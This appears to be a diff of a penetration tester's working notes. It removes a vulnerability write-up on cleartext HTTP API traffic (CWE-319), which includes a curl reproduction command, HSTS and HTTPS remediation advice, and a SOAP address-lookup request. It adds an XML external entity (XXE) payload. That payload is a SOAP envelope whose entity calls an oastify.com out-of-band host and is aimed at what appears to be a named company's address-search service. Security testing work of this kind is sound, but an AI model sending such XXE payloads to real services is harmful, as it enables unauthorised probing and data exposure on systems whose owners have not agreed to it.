@@ -8,29 +8,4 @@
 <?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:add="http://racq.bespoke.hopewiser.com/AddressLookup" xmlns:add1="http://racq.bespoke.hopewiser.com/AddressLookup.xsd"><soapenv:Header/><soapenv:Body><add:checkAddress><input><add1:StructuredAddress><add1:UnitCd>null</add1:UnitCd><add1:UnitNumber>1405</add1:UnitNumber><add1:LevelCd>null</add1:LevelCd><add1:LevelNumber>null</add1:LevelNumber><add1:Building>92-100</add1:Building><add1:StreetName>Quay</add1:StreetName><add1:StreetNumber>null</add1:StreetNumber><add1:StreetNumber2>null</add1:StreetNumber2><add1:StreetTypeCd>St</add1:StreetTypeCd><add1:StreetSuffixCd>null</add1:StreetSuffixCd><add1:Suburb>BRISBANE CITY</add1:Suburb><add1:Postcode>4000</add1:Postcode><add1:State>QLD</add1:State><add1:Country>AUS</add1:Country></add1:StructuredAddress></input></add:checkAddress></soapenv:Body></soapenv:Envelope>
 
 
-
-Cleartext Transmission of Sensitive Information via HTTP API
-Severity: Medium to High (depending on the sensitivity of the data transmitted)
-CWE: CWE-319: Cleartext Transmission of Sensitive Information
-OWASP API Top 10: API8:2023 – Security Misconfiguration
-Technical Details and Observation
-During security testing of the application, it was observed that the API endpoint (http://[api.example.com]/api/v1/[endpoint]) accepts and processes requests over unencrypted HTTP (Port 80) rather than enforcing encrypted HTTPS (TLS) communication.
-When requests are initiated over HTTP, the server responds directly with a 200 OK status code instead of issuing a 301 Moved Permanently or 308 Permanent Redirect to HTTPS, or dropping the connection entirely. Additionally, the Strict-Transport-Security (HSTS) header is missing from the server's HTTPS responses, leaving clients vulnerable to protocol downgrade attacks. As a result, all request headers (including authentication tokens, API keys, or session cookies), query parameters, and response payloads are transmitted across the network in plaintext.
-Impact
-Transmitting API traffic over unencrypted HTTP exposes both the application and its users to eavesdropping and Man-in-the-Middle (MitM) attacks. Any attacker positioned on the same network path—such as a compromised public Wi-Fi router, a malicious ISP, or an internal network adversary—can passively intercept and read sensitive data in transit, including credentials, bearer tokens, and personally identifiable information (PII). Beyond passive data theft, an active attacker can modify API requests and responses on the fly, leading to unauthorized account takeover, data tampering, or the injection of malicious payloads into client applications.
-Steps to Reproduce
-Open a terminal or an HTTP intercepting proxy (such as Burp Suite or OWASP ZAP).
-Send a standard API request using the http:// scheme instead of https://. For example, using curl:
-Bash
-curl -i -X GET "http://[api.example.com]/api/v1/[endpoint]" \
-  -H "Authorization: Bearer [YOUR_TOKEN]" \
-  -H "Accept: application/json"
-Observe that the server processes the request and returns a 200 OK response containing the API payload rather than redirecting to HTTPS or refusing the connection.
-(Optional) Capture the traffic using a packet analyzer such as Wireshark with the display filter http and ip.addr == [TARGET_IP] to verify that the authorization headers and JSON payload are visible in cleartext.
-Remediation
-Enforce HTTPS Everywhere: Configure the web server, load balancer, or API gateway to strictly require TLS (TLS 1.2 or TLS 1.3). Disable Port 80 entirely for API-only domains, or configure an automatic 301/308 redirect to HTTPS. Note that for non-browser API clients, rejecting Port 80 connections outright is preferable to redirecting, as clients may still transmit sensitive headers on the initial unencrypted request before following the redirect.
-Implement HSTS: Add the Strict-Transport-Security header to all HTTPS responses to instruct supporting clients to communicate exclusively over HTTPS:
-HTTP
-Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-Update Client Configurations: Audit all mobile apps, web frontends, and third-party integrations to ensure all hardcoded base URLs use https://.
-Invalidate Exposed Credentials: If production tokens, API keys, or passwords were transmitted over HTTP, rotate and revoke them immediately.
+<?xml version="1.0"?><!DOCTYPE soapenv:Envelope [<!ENTITY xxe SYSTEM "http://9isshp4d9od0dextuozz16bqdhj87zvo.oastify.com/xxe/xxe">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://suncorp.com.au/services/address/wsdl/0"><soapenv:Header/><soapenv:Body><ns:SearchRequest><CountryCode>AUS</CountryCode><Search>&xxe;</Search><Datasource>PAF</Datasource></ns:SearchRequest></soapenv:Body></soapenv:Envelope>
